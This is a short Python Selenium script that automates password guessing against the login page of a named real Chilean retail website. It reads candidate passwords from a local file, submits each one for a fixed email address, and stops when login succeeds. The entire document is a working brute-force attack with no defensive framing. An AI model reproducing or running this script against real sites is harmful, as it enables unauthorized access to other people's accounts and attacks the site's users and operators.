from selenium import webdriver
import time

archivo = open(r'C:\Users\gndon\Desktop\chromedriver_win32\passwords.txt')
mail = "xofob99898@sartess.com"
contrasena = []

while True:
    agregado = archivo.readline()
    contrasena.append(agregado)
    if  agregado == "":
        break
driver = webdriver.Chrome(r'C:\Users\gndon\Desktop\chromedriver_win32\chromedriver.exe')
driver.get("https://familyshop.cl/on/demandware.store/Sites-FamilyShop-Site/es_CL/Login-Show")
time.sleep(3)
for x in contrasena:
    pathB = driver.find_element_by_xpath('//*[@id="login-form-email"]')
    pathB.send_keys(mail)
    pathB = driver.find_element_by_xpath('//*[@id="login-form-password"]')
    pathB.send_keys(x)
    time.sleep(3)
    if driver.current_url == 'https://familyshop.cl/on/demandware.store/Sites-FamilyShop-Site/es_CL/Login-Show':
        driver.get("https://familyshop.cl/on/demandware.store/Sites-FamilyShop-Site/es_CL/Login-Show")
    if driver.current_url == 'https://familyshop.cl/account?registration=false':
        break
archivo.close()
